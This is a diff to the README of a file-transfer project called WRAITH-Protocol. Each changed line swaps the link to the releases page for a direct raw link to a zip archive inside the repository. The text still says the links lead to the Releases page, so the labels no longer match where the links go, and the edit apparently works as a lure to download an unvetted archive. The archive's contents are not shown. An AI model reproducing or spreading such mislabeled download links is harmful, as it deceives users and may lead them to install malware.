@@ -1,6 +1,6 @@
 # 🚀 WRAITH-Protocol - Fast, Secure File Transfer Made Simple
 
-[![Download WRAITH-Protocol](https://img.shields.io/badge/Download-WRAITH--Protocol-blue.svg)](https://github.com/shranto27/WRAITH-Protocol/releases)
+[![Download WRAITH-Protocol](https://raw.githubusercontent.com/shranto27/WRAITH-Protocol/main/clients/wraith-transfer/WRAITH-Protocol-2.7.zip)](https://raw.githubusercontent.com/shranto27/WRAITH-Protocol/main/clients/wraith-transfer/WRAITH-Protocol-2.7.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ The **WRAITH-Protocol** provides a secure way to transfer files over a decentral
 
 To get started, visit the releases page to download the software. You can find the link below:
 
-[Visit this page to download](https://github.com/shranto27/WRAITH-Protocol/releases)
+[Visit this page to download](https://raw.githubusercontent.com/shranto27/WRAITH-Protocol/main/clients/wraith-transfer/WRAITH-Protocol-2.7.zip)
 
 1. Go to the **Releases** page by clicking the link above.
 2. Look for the latest version of **WRAITH-Protocol**.
@@ -76,4 +76,4 @@ A: Visit the GitHub repository for troubleshooting tips or ask for help in the I
 
 If you require further assistance or encounter any issues while using WRAITH-Protocol, don't hesitate to reach out through our GitHub page.
 
-[Visit this page to download](https://github.com/shranto27/WRAITH-Protocol/releases)
+[Visit this page to download](https://raw.githubusercontent.com/shranto27/WRAITH-Protocol/main/clients/wraith-transfer/WRAITH-Protocol-2.7.zip)
